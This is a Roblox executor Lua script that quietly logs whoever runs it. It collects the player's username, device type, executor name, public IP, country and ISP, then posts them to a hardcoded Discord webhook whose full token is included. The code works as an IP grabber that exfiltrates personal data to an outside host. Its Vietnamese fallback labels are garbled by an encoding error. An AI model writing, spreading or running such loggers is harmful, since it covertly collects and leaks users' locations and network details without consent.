local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")

local Player = Players.LocalPlayer
local Executor = identifyexecutor and identifyexecutor() or "Unknown"

-- Safe http req
local function SafeHttpGet(url)
	local success, result = pcall(function()
		return HttpService:JSONDecode(game:HttpGet(url))
	end)
	return success and result or nil
end

-- ip log
local ipInfo = SafeHttpGet("https://ipwho.is/") or {}
local ip = ipInfo.ip or "ğŸ”’ | KhÃ´ng xÃ¡c Ä‘á»‹nh"
local country = ipInfo.country or "ğŸŒ | KhÃ´ng rÃµ"
local provider = ipInfo.connection and ipInfo.connection.isp or "ğŸ“¶ | KhÃ´ng rÃµ"

-- device
local platform = "â“ | KhÃ´ng rÃµ"
if UserInputService.TouchEnabled then
	platform = "ğŸ“± | Mobile"
elseif UserInputService.KeyboardEnabled then
	platform = "ğŸ’» | PC"
end

-- info save
local data = {
	["embeds"] = {{
		["title"] = "ğŸŒ¸ **Execute Logged** ğŸŒ¸",
		["description"] = string.format(
			"ğŸ‘¤ **Username:** %s\nğŸ’» **Device:** %s\nâš¡ **Executor:** %s\nğŸŒ **IP:** %s\nğŸ“Œ **Country:** %s\nğŸ“¡ **WiFi Provider:** %s",
			Player.Name, platform, Executor, ip, country, provider
		),
		["color"] = 0xFFC0CB, -- Pink Pastel ğŸ€
		["thumbnail"] = {
			["url"] = "https://cdn-icons-png.flaticon.com/512/847/847969.png" -- Avatar icon
		}
	}}
}

-- webhook send
request({
	Url = "https://discord.com/api/webhooks/1435615444479508521/tnK_wCZp1nlWBTEFz-664GoXIVrItvmay6hctSb1frQqnVHBvIEA_EeUx14OVxCycy6Y",
	Method = "POST",
	Headers = {["Content-Type"] = "application/json"},
	Body = HttpService:JSONEncode(data)
})
